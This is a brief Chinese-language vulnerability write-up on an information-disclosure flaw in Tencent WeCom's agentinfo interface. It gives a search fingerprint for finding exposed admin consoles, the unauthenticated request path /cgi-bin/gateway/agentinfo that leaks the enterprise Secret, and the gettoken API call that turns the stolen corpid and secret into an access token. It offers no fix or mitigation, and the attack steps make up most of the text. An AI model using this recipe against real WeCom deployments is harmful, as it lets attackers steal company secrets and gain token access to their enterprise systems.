# 腾讯 企业微信 agentinfo 信息泄漏漏洞

## 漏洞描述

腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret

## 漏洞影响

腾讯 企业微信

## 网络测绘

```
web.body="wework_admin.normal_layout"
```

## 漏洞复现

登陆页面

![image-20230828145521417](images/image-20230828145521417.png)

验证POC

```
/cgi-bin/gateway/agentinfo
```

![image-20230828145533569](images/image-20230828145533569.png)

获取Token

```
https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=<YOUR_CORPID>&corpsecret=<YOUR_CORPSECRET>
```

